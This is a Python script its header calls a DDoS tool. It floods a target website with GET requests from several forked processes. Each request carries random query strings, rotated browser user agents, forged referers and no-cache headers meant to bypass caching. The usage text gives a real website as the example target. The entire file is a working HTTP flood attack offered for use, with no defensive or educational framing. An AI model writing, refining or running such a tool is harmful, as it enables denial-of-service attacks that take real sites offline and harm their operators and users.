#!/usr/bin/python3

# function : ddos tools
# author   : firefoxbug

import os
import re
import sys
import time
import signal
import socket
import getopt
import random
import requests
import threading

def usage():
    print('''
usage : python attack.py [-t] [-c] http://www.baidu.com/
-h : help
-t : lasting time of ddos
-c : numbers of thread to create
''')
    sys.exit()

# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ]
    return headers_useragents

# generates a referer array
def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        f'http://{host}/'
    ]
    return headers_referers

def handler(signum, _):
    if signum == signal.SIGALRM:
        print("Time is up!")
        print("finished!")
    sys.exit()

# builds random ascii string
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def send_packet(host, param_joiner):
    url_with_params = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Host': host
    }
    try:
        response = requests.get(url_with_params, headers=headers)
    except requests.exceptions.HTTPError as error:
        pass
    except requests.exceptions.RequestException as error:
        pass

def attack(host, param_joiner):
    while True:
        send_packet(host, param_joiner)

def parse_parameters(parameters):
    global url
    global interval
    global num_thread
    interval_def = 30
    num_thread_def = 5
    interval = interval_def
    num_thread = num_thread_def
    try:
        opts, args = getopt.getopt(parameters, "ht:c:", ["help"])
        url = args[0]
        for opt, arg in opts:
            if opt in ('-h', '--help'):
                usage()
            elif opt in ('-t', '--time'):
                if arg.isdigit():
                    interval = int(arg)
                else:
                    usage()
            elif opt in ('-c', '--count'):
                if arg.isdigit():
                    num_thread = int(arg)
                else:
                    usage()
    except getopt.GetoptError:
        print("getopt error!")
        usage()
        sys.exit(1)
    except IndexError:
        usage()
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    parse_parameters(sys.argv[1:])
    print("Debug: thread=%d time=%d %s" % (num_thread, interval, url))
    if url.count('/') == 2:
        url = url + "/"
    m = re.search(r'http\://([^/]*)/?.*', url)
    try:
        host = m.group(1)
    except AttributeError as e:
        usage()
        sys.exit()

    useragent_list()
    referer_list()

    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(interval)

    for i in range(num_thread):
        newpid = os.fork()
        if newpid == 0:
            attack(host, param_joiner)
        else:
            continue

    time.sleep(interval)
    signal.alarm(0)
    print("main thread exit...")
